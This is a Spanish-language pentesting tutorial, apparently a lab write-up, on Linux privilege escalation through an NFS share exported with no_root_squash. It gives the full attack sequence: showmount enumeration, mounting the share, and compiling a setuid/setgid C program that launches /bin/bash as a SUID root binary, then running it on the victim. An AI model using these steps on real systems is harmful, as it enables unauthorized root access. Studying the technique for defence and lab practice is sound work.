# NFS (Network File Sharing)

NFS (Network File Sharing) se mantiene en el archivo `/etc/exports` Este archivo se crea durante la instalación del servidor NFS y normalmente puede ser leído por los usuarios.

<figure><img src="../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

La criticidad para la escalda de privilegios aqui reside en el `no_root_squash`, como se ve arriba. Por defecto, NFS cambiará el usuario root a nfsnobody y eliminará cualquier archivo con privilegios de root. Si la opción `no_root_squash` está en un recurso compartido con permisos de escritura podemos crear un ejecutable con el bit SUID activado y ejecutarlo en el sistema de destino.

**1º Enumerar recursos NFC compartidos**

> Con la conexión establecida a la maquina victima, nosotros debemos listar las carpetas compartidas desde nuestra maquina de atacante

```
showmount -e 10.10.200.240 #Victim-IP

Export list for 10.10.200.240:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

```

> Utilizaremos el /home/ubuntu/sharedfolder (tengo permiso de lectura y ejecucion)

**2º Montar un recurso NFS**

En tu maquina de atacante `sudo su` Dentro de `/tmp` hacemos la montura :

`mkdir /tmp/backattack`

Monta el recurso compartido

`sudo mount -t nfs 10.10.200.240:/home/ubuntu/sharedfolder /tmp/backattack`

or

`sudo mount -o rw,nosuid,nodev 10.10.200.240:/home/ubuntu/sharedfolder /tmp/backattack`

**3º Crear un binario SUID Crea un archivo C en el recurso montado desde tu máquina atacante**

`cd /tmp/backattack`

`sudo nano nfs.c`

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);   // Cambiar GID al del usuario root
    setuid(0);   // Cambiar UID al del usuario root
    system("/bin/bash"); // Lanzar un shell
    return 0;
}
```

Compílalo directamente en el recurso compartido

`sudo gcc nfs.c -o nfs -w`

or

`sudo gcc -static -o nfs nfs.c` # X Si da errores

Asigna el bit SUID al binario:

`chmod +s nfs`

Verifica que se haya creado y dado permisos

`ls -l nfs`

**5º Ejecutar el binario en la maquina victima**

Te conectas a la maquina `ssh katcus@10.10.200.240`

Vamos al `/home/ubuntu/sharedfolder` y **ejecutamos el binario SUID**

```
cd /home/ubuntu/sharedfolder
./nfs
```
